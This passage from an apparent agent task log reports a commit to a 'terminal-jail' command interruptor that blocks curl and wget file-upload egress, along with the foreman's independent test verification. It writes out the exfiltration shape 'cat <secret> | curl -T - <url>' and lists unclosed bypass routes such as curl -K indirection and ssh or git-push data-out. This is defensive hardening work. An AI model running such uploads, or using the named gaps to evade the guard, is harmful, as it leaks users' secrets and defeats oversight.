/2026-09-18-integration.md §2.4.", "ts": "2026-09-18T22:10:40.542868+00:00", "worker_status": "complete", "dispatched_at": "2026-09-19T03:29:00+00:00", "completed_at": "2026-09-19T03:44:00+00:00", "attempts": 1, "exit_code": 0, "commit_hash": "3162a25", "files_changed": ["CHANGELOG.md", "README.md", "docs/dogfood/diagnostics.md", "docs/quickstart.md", "plugin/terminal_jail/interruptor/blocklist.py", "plugin/terminal_jail/interruptor/sandbox.py", "plugin/terminal_jail/rules/00-builtins.yaml", "plugin/test_egress_no_delivery.py", "plugin/test_escape_waves.py", "plugin/test_interruptor.py", "scripts/yaml-mirror-parity-probe.py", "skills/terminal-jail-usage/SKILL.md", "specs/interruptor.md"], "lines_added": 1377, "lines_removed": 245, "guard_result": "PASS", "ci_result": "SKIP", "worker_summary": "One worker dispatch, glm-5.3-flash @ zai-glm-default, ~14 min, exit 0, one content commit 3162a25 (+1377/-245, 13 files). The four file-upload egress rules moved from the auto-sandbox layer to the BLOCK layer (builtin-net-curl-upload, -curl-form-upload, -wget-post-file, -remote-tree-copy); blocklist rules are settled by the whole-command pass, so no rewrite and no always-allow short-circuit can approve them. Match-set additions close real bypasses: clustered short flags (-sT, -sd @file, -sF), attached operand -T<path>, =-joined long forms, --data-urlencode name@file, '//' as a whole-tree source, and a quote-aware gap that spans a quoted '&' while still stopping at an unquoted operator. YAML mirror re-baselined to 35 block / 9 sandbox / 10 allow = 54. New end-to-end file plugin/test_egress_no_delivery.py runs the real CLI against a loopback collector: uploads exit 126 with zero requests received; positive controls (plain download, inline-body POST) still execute and still deliver.", "foreman_note": "Tick #292. Foreman-independent verification of 3162a25 (each check run by the foreman, not transcribed from the worker report): (a) suite .venv/bin/python -m pytest -q -p no:cacheprovider -> 821 passed / 5 skipped (pre-tick baseline 732/5); (b) .venv/bin/ruff check . -> All checks passed; (c) scripts/yaml-mirror-parity-probe.py -> ALL PROBES PASS, block=35/35 sandbox=9/9 allow=10/10 total=54/54 with the new per-rule ACTION check; (d) gitreins guard --full -> Tier 1 PASS 4/4 (secrets/lint/tests full/static_analysis); (e) independent live probe (temp script, host rule dirs neutralised) 13/14 vectors exactly as briefed + 4/4 end-to-end CLI cases: curl -T and wget --post-file exit 126 with the collector receiving ZERO requests, plain download and inline-body POST still deliver; (f) independent RED proof: git archive c454ccf + the new E2E test -> 4 failed / 2 passed (failed by assertion on 'modify'), the 2 positive controls pass on both revisions by design; (g) the secret-pipe shape 'cat <secret> | curl -T - <url>' now blocks via builtin-net-curl-upload (df17df16's -file-exfil-pipe no longer claims it) - desired behaviour, noted for rule-attribution stability. LIVE HOST MIRROR NOT REFRESHED BY DESIGN: this box's ~/.config/terminal-jail/rules.d/00-builtins.yaml (mtime Sep 18 21:40, pre-DF-20) still carries the four ids at action: sandbox, and a same-id user rule REPLACES the builtin layer, so the live CLI here still rewrites-and-runs (measured: 'host-verdict modify builtin-net-curl-upload'). The fix takes effect only after ./install.sh refreshes that mirror; the upgrade note is in README 1c, specs/interruptor.md 4.5 and CHANGELOG. RESIDUAL, named and NOT claimed contained: helper-script-assembled payloads, curl -K/--config indirection, inline bodies, ssh/git-push data-out, interpreter APIs outside the named primitives, and the fact that nothing here is verified against a real network egress policy (loopback collector on this host only). resolved_without_code: no.", "blocked_reason": null, "updated_at": "2026-09-18 22:55:00.000000"}
